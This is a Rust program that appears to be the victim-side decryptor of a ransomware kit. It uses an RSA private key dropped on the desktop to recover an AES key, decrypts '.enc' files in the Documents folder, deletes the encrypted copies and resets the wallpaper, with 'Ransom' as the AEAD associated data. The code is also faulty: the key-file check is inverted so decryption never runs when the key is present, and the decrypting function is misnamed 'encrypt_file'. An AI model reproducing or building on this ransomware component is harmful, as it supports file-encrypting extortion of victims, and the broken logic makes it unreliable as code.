use std::fs::{self, remove_file, File, OpenOptions};
use std::io::{self, Read, Write};

extern crate winapi;
use ring::aead::{Aad, BoundKey, Nonce, NonceSequence, OpeningKey, UnboundKey, AES_256_GCM};
use ring::error::Unspecified;
use ring::aead::NONCE_LEN;
use rsa::{Pkcs1v15Encrypt, RsaPrivateKey};
use rsa::pkcs8::DecodePrivateKey;
use winapi::um::winuser::{SystemParametersInfoW, SPI_SETDESKWALLPAPER, SPIF_UPDATEINIFILE, SPIF_SENDCHANGE};

use walkdir::WalkDir;

struct CounterNonceSequence(u32);

impl NonceSequence for CounterNonceSequence {
    // called once for each seal operation
    fn advance(&mut self) -> Result<Nonce, Unspecified> {
        let mut nonce_bytes = vec![0; NONCE_LEN];

        let bytes = self.0.to_be_bytes();
        nonce_bytes[8..].copy_from_slice(&bytes);
        
        self.0 += 1; // advance the counter
        Nonce::try_assume_unique_for_key(&nonce_bytes)
    }
}


fn encrypt_file(
    input_file_path: &str,
    output_file_path: &str,
    key_bytes: Vec<u8>,
) -> Result<(), Box<dyn std::error::Error>> {

    let nonce_sequence = CounterNonceSequence(1);
    let key = UnboundKey::new(&AES_256_GCM, &key_bytes).unwrap();

    let mut opening_key = OpeningKey::new(key, nonce_sequence);


    let mut input_file = File::open(input_file_path)?;
    let mut input_data = Vec::new();
    input_file.read_to_end(&mut input_data)?;

    let mut cypher  = input_data.clone();

    let associated_data = Aad::from(b"Ransom");

    let decrypt = opening_key.open_in_place(associated_data, &mut cypher).unwrap();

    
    let mut output_file = OpenOptions::new()
        .write(true)
        .create(true)
        .open(output_file_path)?;
    output_file.write_all(&decrypt)?;

    Ok(())
}

fn main() {
    let extensions = ["enc"];
    println!("On your desktop put the key provided (private RSA key) to you named decrypt.txt");
    let desktop_dir = dirs::desktop_dir().unwrap();
    let key_file_path = desktop_dir.join("decrypt.txt");
    if !key_file_path.exists(){
        println!("No key found")
    } else {
        println!("{:?}", fs::read_to_string(key_file_path.clone()));
        return;
    }
    println!("If the the key is incorrect to rescue will be executed, press enter");
    let mut input = String::new();
    io::stdin()
        .read_line(&mut input)
        .expect("Failed to read line");

    let documents_dir = match dirs::document_dir() {
        Some(path) => path,
        None => {
            eprintln!("Could not find the Documents folder.");
            return;
        }
    };

    let priv_pem = fs::read_to_string(key_file_path).unwrap();


    let p = RsaPrivateKey::from_pkcs8_pem(&priv_pem).unwrap();
    let pass = p.decrypt(Pkcs1v15Encrypt, &fs::read(desktop_dir.join("password_encrypted_DONT_DELETE.txt")).unwrap()).unwrap();

    for entry in WalkDir::new(documents_dir)
        .into_iter()
        .filter_map(Result::ok)
        .filter(|e| {
            e.file_type().is_file() &&
            e.path().extension()
                .and_then(|ext| ext.to_str())
                .map(|ext| extensions.contains(&ext))
                .unwrap_or(false)
        }) {
        let _encrypted_filee = encrypt_file(entry.path().to_str().unwrap_or(""), &entry.path().to_str().unwrap().replace(".enc", ""), pass.clone());
        let _ = remove_file(entry.path());
    }

    let _ = set_default_desktop_background();

    let mut input = String::new();
    io::stdin()
        .read_line(&mut input)
        .expect("Failed to read line");

}

fn set_default_desktop_background() -> Result<(), String> {
    unsafe {
        let result = SystemParametersInfoW(
            SPI_SETDESKWALLPAPER,
            0,
            std::ptr::null_mut(),
            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE,
        );

        if result == 0 {
            return Err("Failed to set default desktop background".to_string());
        }
    }

    Ok(())
}